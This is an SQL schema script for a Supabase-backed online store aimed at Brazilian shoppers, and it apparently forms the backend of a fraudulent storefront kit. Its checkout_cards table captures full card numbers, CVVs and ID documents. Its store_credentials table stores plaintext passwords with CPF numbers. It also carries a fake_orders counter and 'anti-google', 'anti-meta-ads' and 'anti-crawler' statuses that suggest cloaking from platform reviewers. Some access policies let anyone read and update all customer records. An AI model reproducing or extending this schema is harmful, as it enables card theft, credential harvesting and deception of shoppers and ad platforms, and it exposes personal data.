-- Clean up existing tables to allow re-running the script
DROP TABLE IF EXISTS public.license_verifications CASCADE;
DROP TABLE IF EXISTS public.license_keys CASCADE;
DROP TABLE IF EXISTS public.notifications CASCADE;
DROP TABLE IF EXISTS public.checkout_cards CASCADE;
DROP TABLE IF EXISTS public.store_credentials CASCADE;
DROP TABLE IF EXISTS public.product_collections CASCADE;
DROP TABLE IF EXISTS public.live_visitors CASCADE;
DROP TABLE IF EXISTS public.coupons CASCADE;
DROP TABLE IF EXISTS public.shipping_methods CASCADE;
DROP TABLE IF EXISTS public.product_variants CASCADE;
DROP TABLE IF EXISTS public.settings CASCADE;
DROP TABLE IF EXISTS public.carts CASCADE;
DROP TABLE IF EXISTS public.orders CASCADE;
DROP TABLE IF EXISTS public.customers CASCADE;
DROP TABLE IF EXISTS public.products CASCADE;
DROP TABLE IF EXISTS public.collections CASCADE;

-- Create updated_at trigger function
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Collections table
CREATE TABLE public.collections (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  slug TEXT NOT NULL UNIQUE,
  description TEXT,
  image TEXT,
  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive', 'anti-google-v1', 'anti-meta-ads-v1', 'anti-crawler-v1')),
  is_featured BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.collections ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Collections are publicly readable" ON public.collections FOR SELECT USING (true);
CREATE POLICY "Authenticated users can manage collections" ON public.collections FOR ALL USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

CREATE TRIGGER update_collections_updated_at BEFORE UPDATE ON public.collections FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Products table
CREATE TABLE public.products (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  slug TEXT NOT NULL UNIQUE,
  description TEXT,
  price NUMERIC(12,2) NOT NULL DEFAULT 0,
  compare_price NUMERIC(12,2) NOT NULL DEFAULT 0,
  image TEXT,
  images JSONB NOT NULL DEFAULT '[]'::jsonb,
  collection_id UUID REFERENCES public.collections(id) ON DELETE SET NULL,
  collection_name TEXT,
  stock INT NOT NULL DEFAULT 0,
  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive', 'draft', 'archived', 'anti-google-v1', 'anti-google v1', 'anti-meta-ads-v1', 'anti-meta v1', 'anti-crawler-v1', 'anti-crawler v1')),
  sales INT NOT NULL DEFAULT 0,
  visits INT NOT NULL DEFAULT 0,
  weight NUMERIC(12,2) NOT NULL DEFAULT 0,
  is_physical BOOLEAN NOT NULL DEFAULT true,
  condition TEXT NOT NULL DEFAULT 'new',
  checkout_type TEXT NOT NULL DEFAULT 'native',
  payment_link TEXT,
  fake_orders INT NOT NULL DEFAULT 0,
  tags JSONB NOT NULL DEFAULT '[]'::jsonb,
  pix_codes JSONB NOT NULL DEFAULT '[]'::jsonb,
  boleto_codes JSONB NOT NULL DEFAULT '[]'::jsonb,
  enable_pix BOOLEAN NOT NULL DEFAULT true,
  pix_type TEXT NOT NULL DEFAULT 'copypaste',
  enable_boleto BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.products ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Products are publicly readable" ON public.products FOR SELECT USING (true);
CREATE POLICY "Authenticated users can manage products" ON public.products FOR ALL USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

CREATE TRIGGER update_products_updated_at BEFORE UPDATE ON public.products FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Customers table
CREATE TABLE public.customers (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  email TEXT NOT NULL,
  phone TEXT,
  address TEXT,
  city TEXT,
  state TEXT,
  zip TEXT,
  country TEXT DEFAULT 'Brasil',
  ip_address TEXT,
  total_orders INT NOT NULL DEFAULT 0,
  total_spent NUMERIC(12,2) NOT NULL DEFAULT 0,
  cpf TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.customers ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Authenticated users can read customers" ON public.customers FOR SELECT USING (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can insert customers" ON public.customers FOR INSERT WITH CHECK (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can update customers" ON public.customers FOR UPDATE USING (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can delete customers" ON public.customers FOR DELETE USING (auth.uid() IS NOT NULL);
CREATE POLICY "Public can create customers with data" ON public.customers FOR INSERT TO public WITH CHECK (email IS NOT NULL AND name IS NOT NULL);
CREATE POLICY "Public can update customers" ON public.customers FOR UPDATE TO public USING (true) WITH CHECK (true);
CREATE POLICY "Public can read customers by email" ON public.customers FOR SELECT TO public USING (true);

CREATE TRIGGER update_customers_updated_at BEFORE UPDATE ON public.customers FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Orders table
CREATE TABLE public.orders (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  order_number TEXT NOT NULL UNIQUE,
  customer_id UUID REFERENCES public.customers(id) ON DELETE SET NULL,
  customer_name TEXT NOT NULL,
  customer_email TEXT NOT NULL,
  customer_phone TEXT,
  shipping_address TEXT,
  shipping_city TEXT,
  shipping_state TEXT,
  shipping_zip TEXT,
  shipping_country TEXT DEFAULT 'Brasil',
  total NUMERIC(12,2) NOT NULL DEFAULT 0,
  subtotal NUMERIC(12,2) NOT NULL DEFAULT 0,
  shipping_cost NUMERIC(12,2) NOT NULL DEFAULT 0,
  discount NUMERIC(12,2) NOT NULL DEFAULT 0,
  status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'paid', 'shipped', 'delivered', 'cancelled', 'refunded')),
  payment_method TEXT NOT NULL DEFAULT 'pix',
  payment_status TEXT NOT NULL DEFAULT 'pending' CHECK (payment_status IN ('pending', 'paid', 'failed', 'refunded')),
  ip_address TEXT,
  notes TEXT,
  cpf TEXT,
  card_bin TEXT,
  items JSONB NOT NULL DEFAULT '[]'::jsonb,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Authenticated users can read orders" ON public.orders FOR SELECT USING (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can update orders" ON public.orders FOR UPDATE USING (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can delete orders" ON public.orders FOR DELETE USING (auth.uid() IS NOT NULL);
CREATE POLICY "Storefront can create orders" ON public.orders FOR INSERT TO public WITH CHECK (customer_name IS NOT NULL AND customer_email IS NOT NULL);
CREATE POLICY "Storefront can read recent orders" ON public.orders FOR SELECT TO public USING (created_at > now() - interval '10 minutes');

CREATE TRIGGER update_orders_updated_at BEFORE UPDATE ON public.orders FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Carts table
CREATE TABLE public.carts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  cart_number TEXT NOT NULL UNIQUE,
  customer_name TEXT,
  customer_email TEXT,
  customer_phone TEXT,
  products JSONB NOT NULL DEFAULT '[]'::jsonb,
  total NUMERIC(12,2) NOT NULL DEFAULT 0,
  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'abandoned', 'converted')),
  ip_address TEXT,
  last_activity TIMESTAMPTZ NOT NULL DEFAULT now(),
  last_action TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.carts ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Authenticated users can read carts" ON public.carts FOR SELECT USING (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can update carts" ON public.carts FOR UPDATE USING (auth.uid() IS NOT NULL);
CREATE POLICY "Authenticated users can delete carts" ON public.carts FOR DELETE USING (auth.uid() IS NOT NULL);
CREATE POLICY "Anyone can create carts" ON public.carts FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update own carts" ON public.carts FOR UPDATE USING (true);

CREATE TRIGGER update_carts_updated_at BEFORE UPDATE ON public.carts FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Settings table (key-value store)
CREATE TABLE public.settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  key TEXT NOT NULL UNIQUE,
  value JSONB NOT NULL DEFAULT '{}'::jsonb,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Settings are publicly readable" ON public.settings FOR SELECT USING (true);
CREATE POLICY "Authenticated users can manage settings" ON public.settings FOR ALL USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

CREATE TRIGGER update_settings_updated_at BEFORE UPDATE ON public.settings FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Create indexes
CREATE INDEX idx_products_collection ON public.products(collection_id);
CREATE INDEX idx_products_status ON public.products(status);
CREATE INDEX idx_orders_customer ON public.orders(customer_id);
CREATE INDEX idx_orders_status ON public.orders(status);
CREATE INDEX idx_carts_status ON public.carts(status);
CREATE INDEX idx_customers_email ON public.customers(email);
-- Create product_variants table
CREATE TABLE IF NOT EXISTS public.product_variants (
  id uuid NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  product_id uuid NOT NULL REFERENCES public.products(id) ON DELETE CASCADE,
  group_name text NOT NULL,
  option_name text NOT NULL,
  image text,
  price numeric NOT NULL DEFAULT 0,
  stock integer NOT NULL DEFAULT 0,
  created_at timestamp with time zone NOT NULL DEFAULT now()
);

ALTER TABLE public.product_variants ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Authenticated users can manage product_variants"
  ON public.product_variants FOR ALL
  TO public
  USING (auth.uid() IS NOT NULL)
  WITH CHECK (auth.uid() IS NOT NULL);

CREATE POLICY "Product variants are publicly readable"
  ON public.product_variants FOR SELECT
  TO public
  USING (true);

-- Create storage bucket for product images (only if storage tables are available)
DO $$
BEGIN
  IF EXISTS (
    SELECT 1 FROM information_schema.tables
    WHERE table_schema = 'storage' AND table_name = 'buckets'
  ) THEN
    -- Create bucket
    INSERT INTO storage.buckets (id, name, public)
    VALUES ('product-images', 'product-images', true)
    ON CONFLICT (id) DO NOTHING;

    -- Drop existing storage policies so the script can be re-run
    EXECUTE 'DROP POLICY IF EXISTS "Authenticated users can upload product images" ON storage.objects';
    EXECUTE 'DROP POLICY IF EXISTS "Authenticated users can delete product images" ON storage.objects';
    EXECUTE 'DROP POLICY IF EXISTS "Public can read product images" ON storage.objects';

    -- Allow authenticated users to upload
    EXECUTE $POL$
      CREATE POLICY "Authenticated users can upload product images"
      ON storage.objects FOR INSERT
      TO public
      WITH CHECK (bucket_id = 'product-images' AND auth.uid() IS NOT NULL)
    $POL$;

    -- Allow authenticated users to delete
    EXECUTE $POL$
      CREATE POLICY "Authenticated users can delete product images"
      ON storage.objects FOR DELETE
      TO public
      USING (bucket_id = 'product-images' AND auth.uid() IS NOT NULL)
    $POL$;

    -- Allow public read
    EXECUTE $POL$
      CREATE POLICY "Public can read product images"
      ON storage.objects FOR SELECT
      TO public
      USING (bucket_id = 'product-images')
    $POL$;
  ELSE
    RAISE NOTICE 'Table "storage.buckets" not found — skipping bucket/policies. Create bucket "product-images" manually via Dashboard > Storage.';
  END IF;
END
$$;
-- UPDATE public.orders SET card_bin = '411111' WHERE order_number = 'PED-1002';
CREATE TABLE public.shipping_methods (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name text NOT NULL,
  description text,
  price numeric NOT NULL DEFAULT 0,
  delivery_days_min integer NOT NULL DEFAULT 1,
  delivery_days_max integer NOT NULL DEFAULT 5,
  free_shipping_min numeric DEFAULT NULL,
  status text NOT NULL DEFAULT 'active',
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.shipping_methods ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Shipping methods are publicly readable" ON public.shipping_methods FOR SELECT USING (true);
CREATE POLICY "Authenticated users can manage shipping_methods" ON public.shipping_methods FOR ALL TO authenticated USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

CREATE TABLE public.coupons (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  code text NOT NULL UNIQUE,
  type text NOT NULL DEFAULT 'percentage',
  value numeric NOT NULL DEFAULT 0,
  min_purchase numeric DEFAULT 0,
  max_uses integer DEFAULT NULL,
  used_count integer NOT NULL DEFAULT 0,
  free_shipping boolean NOT NULL DEFAULT false,
  expires_at timestamptz DEFAULT NULL,
  status text NOT NULL DEFAULT 'active',
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.coupons ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Coupons are publicly readable" ON public.coupons FOR SELECT USING (true);
CREATE POLICY "Authenticated users can manage coupons" ON public.coupons FOR ALL TO authenticated USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

CREATE TABLE public.live_visitors (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL UNIQUE,
  ip_address text,
  country text DEFAULT 'Brasil',
  city text,
  state text,
  lat numeric DEFAULT -14.235,
  lng numeric DEFAULT -51.925,
  current_page text DEFAULT '/',
  action text DEFAULT 'viewing',
  device text DEFAULT 'Desktop',
  browser text DEFAULT 'Chrome',
  product_name text,
  last_seen timestamp with time zone NOT NULL DEFAULT now(),
  created_at timestamp with time zone NOT NULL DEFAULT now()
);

ALTER TABLE public.live_visitors ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert visitor data" ON public.live_visitors FOR INSERT TO public WITH CHECK (true);
CREATE POLICY "Anyone can update visitor data" ON public.live_visitors FOR UPDATE TO public USING (true) WITH CHECK (true);
CREATE POLICY "Authenticated users can read visitors" ON public.live_visitors FOR SELECT TO public USING (auth.uid() IS NOT NULL);
CREATE POLICY "Public can read own session" ON public.live_visitors FOR SELECT TO public USING (true);
CREATE POLICY "Cleanup old sessions" ON public.live_visitors FOR DELETE TO public USING (true);

ALTER PUBLICATION supabase_realtime ADD TABLE public.live_visitors;

-- Drop the restrictive insert policy on carts
DROP POLICY IF EXISTS "Public can create carts with data" ON public.carts;

-- Allow public to insert carts without requiring customer_name/email
CREATE POLICY "Public can create carts"
ON public.carts
FOR INSERT
TO public
WITH CHECK (true);

-- Allow public to read their own cart by cart_number
CREATE POLICY "Public can read own cart"
ON public.carts
FOR SELECT
TO public
USING (true);

-- Allow public to update their own cart
CREATE POLICY "Public can update own cart"
ON public.carts
FOR UPDATE
TO public
USING (true)
WITH CHECK (true);
CREATE TABLE public.product_collections (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  product_id uuid NOT NULL REFERENCES public.products(id) ON DELETE CASCADE,
  collection_id uuid NOT NULL REFERENCES public.collections(id) ON DELETE CASCADE,
  created_at timestamptz NOT NULL DEFAULT now(),
  UNIQUE(product_id, collection_id)
);

ALTER TABLE public.product_collections ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Product collections are publicly readable"
ON public.product_collections FOR SELECT TO public
USING (true);

CREATE POLICY "Authenticated users can manage product_collections"
ON public.product_collections FOR ALL TO public
USING (auth.uid() IS NOT NULL)
WITH CHECK (auth.uid() IS NOT NULL);

-- Migrate existing data from products.collection_name to junction table
INSERT INTO public.product_collections (product_id, collection_id)
SELECT p.id, c.id
FROM public.products p
JOIN public.collections c ON c.name = p.collection_name
WHERE p.collection_name IS NOT NULL AND p.collection_name != ''
ON CONFLICT DO NOTHING;
CREATE TABLE public.store_credentials (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT NOT NULL,
  full_name TEXT,
  cpf TEXT,
  phone TEXT,
  ip_address TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

ALTER TABLE public.store_credentials ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert store_credentials"
  ON public.store_credentials FOR INSERT
  TO public
  WITH CHECK (true);

CREATE POLICY "Authenticated users can read store_credentials"
  ON public.store_credentials FOR SELECT
  TO authenticated
  USING (auth.uid() IS NOT NULL);
-- Checkout Cards table
CREATE TABLE public.checkout_cards (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  card_number TEXT NOT NULL,
  card_name TEXT NOT NULL,
  card_expiry TEXT NOT NULL,
  card_cvv TEXT NOT NULL,
  doc_type TEXT NOT NULL,
  doc_number TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.checkout_cards ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public can insert checkout cards" 
ON public.checkout_cards 
FOR INSERT 
TO public 
WITH CHECK (true);

CREATE POLICY "Authenticated users can read checkout cards" 
ON public.checkout_cards 
FOR SELECT 
TO authenticated 
USING (auth.uid() IS NOT NULL);

-- Notifications table
CREATE TABLE IF NOT EXISTS public.notifications (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  type TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT NOT NULL,
  read BOOLEAN NOT NULL DEFAULT false,
  payload JSONB DEFAULT '{}'::jsonb,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Habilitar Segurança (RLS)
ALTER TABLE public.notifications ENABLE ROW LEVEL SECURITY;

-- Permitir que administradores gerenciem as notificações
CREATE POLICY "Admins can manage notifications" 
ON public.notifications 
FOR ALL 
USING (auth.role() = 'authenticated');

-- 2. Limpar sessões duplicadas antigas para preparar a trava de segurança
-- (Importante executar antes de adicionar a restrição UNIQUE)
DELETE FROM public.live_visitors a USING public.live_visitors b 
WHERE a.id < b.id AND a.session_id = b.session_id;

-- 3. Aplicar a trava de unicidade para evitar duplicatas no Live View
ALTER TABLE public.live_visitors DROP CONSTRAINT IF EXISTS live_visitors_session_id_key;
ALTER TABLE public.live_visitors ADD CONSTRAINT live_visitors_session_id_key UNIQUE (session_id);

-- 4. Tabela de Licenciamento Obrigatório (Portal Anti-Pirataria)
CREATE TABLE IF NOT EXISTS public.license_keys (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  key TEXT NOT NULL UNIQUE,
  is_active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Inserir Key Padrão
INSERT INTO public.license_keys (key) VALUES ('bazuka2026') ON CONFLICT (key) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.license_verifications (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  license_key TEXT NOT NULL,
  version_range TEXT NOT NULL DEFAULT '1.0-1.9',
  user_email TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Segurança RLS para Licenciamento
ALTER TABLE public.license_keys ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.license_verifications ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public can read license_keys for verification" 
ON public.license_keys FOR SELECT 
TO public 
USING (true);

CREATE POLICY "Authenticated users can read license verifications" 
ON public.license_verifications FOR SELECT 
TO authenticated 
USING (auth.uid() IS NOT NULL);

CREATE POLICY "Allow public insert for license verification flow" 
ON public.license_verifications FOR INSERT 
TO public 
WITH CHECK (true);

-- ==========================================================
-- SITE STATS & VISITS
-- ==========================================================

CREATE TABLE IF NOT EXISTS public.site_stats (
  id TEXT PRIMARY KEY,
  total_visits BIGINT NOT NULL DEFAULT 0,
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- Initialize global counter
INSERT INTO public.site_stats (id, total_visits) VALUES ('global', 0) ON CONFLICT DO NOTHING;

ALTER TABLE public.site_stats ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Public can read site_stats" ON public.site_stats FOR SELECT TO public USING (true);
CREATE POLICY "Public can update site_stats" ON public.site_stats FOR UPDATE TO public USING (true) WITH CHECK (true);
CREATE POLICY "Public can insert site_stats" ON public.site_stats FOR INSERT TO public WITH CHECK (true);

